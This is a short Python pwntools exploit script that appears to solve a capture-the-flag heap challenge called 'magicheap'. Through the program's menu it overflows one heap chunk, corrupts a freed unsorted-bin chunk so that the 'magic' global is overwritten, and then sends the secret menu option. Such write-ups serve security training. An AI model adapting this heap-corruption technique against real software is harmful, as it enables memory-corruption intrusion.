#!/usr/bin/env python
# coding=utf-8
# author: thinkycx
# date: 2018-10-31
from pwn import *
context.local(arch='amd64', os='linux')

def create_heap(size, content):
    io.recvuntil("Your choice :")
    io.sendline("1")
    io.recvuntil(":")
    io.sendline(str(size))
    io.recvuntil(":")
    io.sendline(content)


def edit_heap(idx, size, content):
    io.recvuntil("Your choice :")
    io.sendline("2")
    io.recvuntil(":")
    io.sendline(str(idx))
    io.recvuntil(":")
    io.sendline(str(size))
    io.recvuntil(":")
    io.sendline(content)


def del_heap(idx):
    io.recvuntil("Your choice :")
    io.sendline("3")
    io.recvuntil(":")
    io.sendline(str(idx))

def pwn(io):
    create_heap(0x10,"thinkycx") # 0
    create_heap(0x80, "thinkycx") # 0 1 
    create_heap(0x10, "thinkycx") # 0 1 2 
    # gdb.attach(io,'break *0x0000000000400CA2')
    
    del_heap(1)


    unsortedbin_payload = "a"*0x10 + p64(0) + p64(0x91) + p64(0xdeadbeafdeadbeaf) +\
            p64(elf.symbols['magic']-0x10) 
    edit_heap(0, 6*0x8,  unsortedbin_payload)
    create_heap(0x80, "thinkycx")
    io.recvuntil("Your choice :")
    io.sendline("4869")



if __name__ == '__main__':
    global io, elf, libc, debug
    local, debug = 1, 0
    # context.log_level = 'debug'
    filename = './magicheap'
    elf = ELF(filename)
    if local:
        # socat tcp-l:10002,fork exec:./filename
        io = process(filename)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        context.terminal = ['tmux', 'splitw', '-h' ]
    else:
        io = remote("ip",10001)
    pwn(io)
    io.interactive()
